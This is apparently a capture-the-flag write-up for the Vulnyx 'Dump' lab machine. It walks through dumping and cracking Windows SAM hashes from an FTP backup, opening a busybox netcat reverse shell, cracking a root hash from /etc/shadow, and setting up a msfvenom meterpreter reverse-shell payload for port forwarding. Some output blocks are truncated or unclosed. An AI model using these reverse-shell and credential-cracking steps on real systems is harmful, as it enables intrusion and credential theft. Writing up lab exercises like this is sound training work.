# Machine Info

Dump was an easy rated Linux machine on Vulnyx, Involves dumping user hashes from SAM file and cracking it those hashes using hashcat for initial access. For root access, user dumper have writes to read the `/etc/shadow` file, which leaks the root user password hash which leads to get access to root user on the box.

## Scanning through Nmap

First of all we will go with nmap to scan the whole network and check for services running on the network. To scan the whole network and find all the open ports i use **-p-** used to scan the whole **65535** ports with **--min-rate 10000** to scan network faster from **nmap** and i found a list of open ports on the network and get only the open ports using different terminal tools like **cut**, **tr** etc. 

```shell
$ nmap -p- --min-rate 10000 192.168.190.134 -oN ini.txt && cat ini.txt | cut  -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','
21,80, 4200
```

Now Let's run the depth scan on these specific ports using 

```bash
$ nmap -p21,80,4200 -sC -sV -A -T4 192.168.190.134 -oN scan.txt
```

- **-sC** is to run all the default scripts
- **-sV** for service and version detection
- **-A** to check all default things
- **-T4** for aggressive scan
- **-oN** to write the result into a specified file

```bash
PORT     STATE SERVICE  VERSION

Through Nmap, we found three open ports, **21 FTP** with anonymous login allowed, port **80 HTTP** web and port **4200 ssl/HTTP** also web. Becasue we are allowed to login as anonymous user on FTP, lets dive into it and check if we found any useful file or folder their.

### 21 FTP

After login to FTP using anonymous credientials, we found a **.backup** directory. after looking into the **.backup** directory, we found two files **sam.bak** and **system.bak**. 
So what are **sam** and **system** files, **sam** file is a file in windows that holds the **usernames** and **NTLM** password hashes of local users on system. This is file is encrypted and it's key is stored in a registry file called **system**. You can learn more about it [here](https://juggernaut-sec.com/dumping-credentials-sam-file-hashes/)

<img  alt="Pasted image 20240415093027" src="https://github.com/iammR0OT/Vulnyx/assets/74102381/44353a42-8d79-4d12-af4e-e1002c4abfea">

So in our case we have both system and sam file, lets try to dump the password hashes from it, we can use tool called secretsdump.py from impacket toolkit for that purpose
**SecretsDump.py** is a Python tool by Impacket that can extract secrets from targets. **SecretsDump.py** performs various techniques to dump hashes from the remote machine without executing any agent there. For **SAM** and **LSA** Secrets (including cached creds) it tries to read as much as it can from the **registry** and then saves the hives in the target system `(%SYSTEMROOT%\Temp dir)` and reads the rest of the data from there. For **NTDS.dit** it uses the **Volume Shadow Copy Service** to read NTDS.dit directly from the disk or it can use the parser module to read NTDS.dit files from a copy.
secretsdump.py dump **usernames** and their **password** hashes for us, if we were facing a windows machine, then we can perform **pass-the-hash** attack to gain access on the machine, without decrypting it. But, because we are on Linux machine, we have to decrypt it.

```bash
$ secretsdump.py -sam sam.bak -system system.bak LOCAL
```

- **-sam** to parse sam file
- **-system** to parse system file
- **LOCAL** because we parse these files locally

```

After saving these hashes let's fire up hashcat to perform dictionary attack to decrypt these hashes.
Hashcat is **a password cracking tool used for licit and illicit purposes**. Hashat is a particularly fast, efficient, and versatile hacking tool that assists brute-force attacks by conducting them with hash values of passwords that the tool is guessing or applying

```bash
$ hashcat -m 1000 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

- **-m** to specify module number of NTLM hash which is 1000 in our case

We were successfully able to crack the password of user **admin** and **dumper**

```passwords

admin:556a8f7773e850d4cf4d789d39ddaca0:blabla
```

### 80 HTTP

On port 80 their is a simple apache default page is runnig. feroxbuster also didn't found any useful path their.

### 4200 HTTPs

On TCP port 4200, there is a some kind of login page is working called dump login.

<img alt="Pasted image 20240415095754" src="https://github.com/iammR0OT/Vulnyx/assets/74102381/9ea8608c-b05b-41c0-a7b6-5e2cbb996bf2">

I tried to login to it using admin credentials but admin credentials didn't worked their, then I tried to login using dumper credentials and it worked and we got a shell on the box as dumper user. Their is also our user flag is present.

<img  alt="Pasted image 20240415100118" src="https://github.com/iammR0OT/Vulnyx/assets/74102381/20f35516-de07-4c82-abaa-1f1241f6d4b7">

Let's get shell on our box using **busybox** and make it stable.

```bash
$ busybox nc 192.168.190.129 9001 -e sh
$ nc -lvnp 9001
$ ptyhon3 -c "import pty; pty.spawn('/bin/bash')"
$ export TERM=xterm
```


# Privilege Escalation

Linpeas reveals that we have a read access to `/etc/shadow` file, a file that contains user's passwords hashes on Linux system. 

<img  alt="Pasted image 20240416102724" src="https://github.com/iammR0OT/Vulnyx/assets/74102381/f6cf35b5-0896-4e50-958a-fc6f29057a75">

Lets, copy root hash and try to break it using hashcat on our local machine.

```bash
$ hashcat -m 1800 root-hash rockyou.txt

# Cracked Hash
$6$jzcdBmCLz0zF2.b/$6sok07AjDc3TN3oeI/NqrdZ6NSQly3ADW6lvs3z5q.5GDqsCypL8WtL7ARhzDcdYgukakXWeNbiIP7GyigCse/:shadow123
```

Linpease also discover that port **22 ssh** was running locally on the machine. I decided to forward it to my attacker machine. 

<img  alt="Pasted image 20240416103403" src="https://github.com/iammR0OT/Vulnyx/assets/74102381/6b2026cc-6e0a-493d-a7ee-1ca975946436">

First, lets get a shell on **metasploit** and then perform port forwarding, there are also  many other ways to perform port forwarding but the metasploit one is more simple and easy.
To get a shell on metasploit, first create a elf file using **msfvenom** and then deliver it on victim machine using python3 server.

```bash
$ msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.190.133 LPORT=4444 -f elf -o shel.elf

# Python server
$ python3 -m http.server 80
```

<img alt="Pasted image 20240415103604" src="https://github.com/iammR0OT/Vulnyx/assets/74102381/a67df831-57e4-413c-a994-9ece495be28b">

After that run a listener on metasploit using

```bash
$ use exploit/multi/handler
$ set payload linux/x64/meterpreter_reverse_tcp
$ set LHOST=<attacker IP>
$ set LPORT=<that you specified in msfvenom payload>
$ run
```

Now whenever someone will run our **shel.elf** file, we will receive a shell back on our metasploit listener.

<img  alt="Pasted image 20240415104043" src="https://github.com/iammR0OT/Vulnyx/assets/74102381/8bde988f-b67e-42e1-b0d7-c8fabebaed39">

Now Lets forward our port 22 to our attacker machine using:

```bash
$ portfwd -l 101 -p 22 -r 127.0.0.1
```

- **-l** for local port
- **-p** for remote port
- **-r** remote host

<img  alt="Pasted image 20240416104103" src="https://github.com/iammR0OT/Vulnyx/assets/74102381/4f3d40ad-0603-4c03-9883-4627d124bfe7">

Now let's get a shell as root using ssh and grab our root.txt.

```bash
$ ssh root@127.0.0.1 -p 101
```
